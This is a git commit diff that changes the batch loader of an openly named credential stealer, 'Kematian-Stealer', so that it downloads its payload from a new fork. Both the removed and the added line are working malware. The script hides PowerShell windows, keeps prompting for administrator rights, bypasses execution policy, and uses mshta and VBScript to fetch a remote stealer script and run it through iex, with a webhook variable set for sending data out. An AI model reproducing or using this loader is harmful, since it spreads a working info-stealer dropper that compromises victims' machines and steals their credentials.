57cfaa572a404ec6129a92b699a54e2dddfa0cbd
kcock25 <fwefwfffwefsdffef@proton.me>
2024-06-16 22:17:03 +0100

    Update main.bat

--- frontend-src/main.bat
+++ frontend-src/main.bat
@@ -2,4 +2,4 @@
 cd /d "%~dp0"
 net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main_ps1_bat.ps1' -UseBasicParsing;$webhook = 'wbhkfrcuh';$debug = $true;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $true | iex",0))
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/kcock25/Kematian-Stealer-V3/main/frontend-src/main_ps1_bat.ps1' -UseBasicParsing;$webhook = 'wbhkfrcuh';$debug = $true;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $true | iex",0))
